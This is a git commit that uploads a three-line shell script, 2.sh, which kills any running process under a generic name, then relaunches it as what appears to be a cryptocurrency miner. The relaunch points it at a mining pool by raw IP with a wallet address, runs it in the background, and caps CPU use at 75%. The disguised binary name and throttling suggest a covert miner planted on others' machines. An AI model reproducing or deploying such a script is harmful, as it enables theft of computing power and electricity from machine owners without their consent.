7da6dc422240e46047bd9c3773fa98e47d83ef33
renrarili <70380549+renrarili@users.noreply.github.com>
2020-08-28 16:36:56 +0300

    Add files via upload

---
+++ 2.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 94.103.94.132:59624 -u 86ghr4FxJzRXcVeSFyATtgQMgRavqxpSCfGJQ9KtqAktCM86JevLvFBiXv2JVTbUSi5qtHmFCu9WKT1guvLjz1c3A8TT2NK --pass=x:fergonmerw3@yandex.ru --rig-id=01 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
